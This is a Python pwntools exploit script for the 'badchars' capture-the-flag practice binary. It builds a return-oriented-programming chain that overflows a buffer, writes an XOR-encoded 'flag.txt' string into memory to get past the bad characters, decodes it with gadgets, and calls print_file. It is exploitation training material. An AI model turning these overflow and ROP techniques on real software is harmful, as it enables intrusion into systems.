#!/usr/bin/python2
from pwn import *

context.arch = 'amd64'
p = process("./badchars", stdin=PTY)
elf = context.binary = ELF("./badchars")
rop = ROP("./badchars")

data_segment = elf.symbols["data_start"]+8
pop_r14_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
payload = None


def xor_flag(flag):
    flag_list = list(flag)
    for i in range(0, len(flag_list)):
        flag_list[i] = chr(ord(flag_list[i])^0x02)
    return "".join(flag_list)


def write_xored_flag_string_in_segment():
    global data_segment, payload
    padding = "\x90"*40

    xored_flag = xor_flag("flag.txt")
    pop_r12_r13_r14_r15 = p64((rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"]))[0])
    mov_r13_r12 = p64(0x400634)

    payload = padding
    payload += pop_r12_r13_r14_r15
    payload += xored_flag
    payload += p64(data_segment)
    payload += "\x00\x00\x00\x00\x00\x00\x00\x00" # to complete r14 with null bytes
    payload += "\x00\x00\x00\x00\x00\x00\x00\x00" # to complete r15 with null bytes
    payload += mov_r13_r12 # to put xored flag in data segment


def unxor_flag_string_in_segment():
    global data_segment, pop_r14_r15, payload 
    xor_byte_ptr_r15_r14 = p64(0x400628)

    # to unXOR each chars
    for i in range(8):
        payload += pop_r14_r15 # to setup XOR key in r14 & data_segment in r15
        payload += p64(0x2) # XOR key
        payload += p64(data_segment + i)
        payload += xor_byte_ptr_r15_r14


def print_flag_via_print_file():
    global data_segment, payload
    pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0])
    print_file_subroutine = p64(elf.symbols["print_file"])

    payload += pop_rdi
    payload += p64(data_segment)
    payload += print_file_subroutine

write_xored_flag_string_in_segment(), unxor_flag_string_in_segment(), print_flag_via_print_file()

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
